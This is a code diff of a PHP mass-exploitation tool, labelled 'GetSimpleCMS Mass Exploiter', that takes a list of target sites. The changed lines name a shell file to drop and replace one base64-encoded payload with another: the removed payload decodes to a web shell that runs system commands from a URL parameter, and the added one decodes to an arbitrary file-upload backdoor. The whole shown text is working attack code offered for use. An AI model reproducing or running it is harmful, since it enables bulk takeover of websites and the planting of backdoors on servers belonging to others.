@@ -1,7 +1,8 @@
 <?php
 /**
 * @author Con7ext <kreonrinto@gmail.com>
-* GetCMS Mass Exploiter
+* GetSimpleCMS Mass Exploiter
+* php file.php list.txt
 **/
 class getCMS{
   public $url;
@@ -20,7 +21,7 @@ class getCMS{
     $this->version = null;
     $this->headers = null;
     $this->shell = "rintods.php";
-    $this->payload = base64_decode("PD9waHAgZWNobyBwaHBfdW5hbWUoKS4iPGJyPiI7IGVjaG8gc3lzdGVtKCRfR0VUW2NdKTsgZWNobyAiPGJyPmNyZWF0ZWQgYnkgY29uN2V4dDxicj4iOz8+");
+    $this->payload = base64_decode("PD9waHAgDQppZihpc3NldCgkX0ZJTEVTWydyaW50b2QnXVsnbmFtZSddKSl7DQogICRuYW1lID0gJF9GSUxFU1sncmludG9kJ11bJ25hbWUnXTsNCiAgJG50b2QgPSAkX0ZJTEVTWydyaW50b2QnXVsndG1wX25hbWUnXTsNCiAgQG1vdmVfdXBsb2FkZWRfZmlsZSgkbnRvZCwgJG5hbWUpOw0KICBlY2hvICRuYW1lOw0KfWVsc2V7DQogIGVjaG8gIjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT48aW5wdXQgdHlwZT1maWxlIG5hbWU9cmludG9kPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1VcGxvYWQ+IjsNCn0gDQo/Pg==");
   }
   public function makeRequest($url, $post = null, $header = null){
     $ch = curl_init();
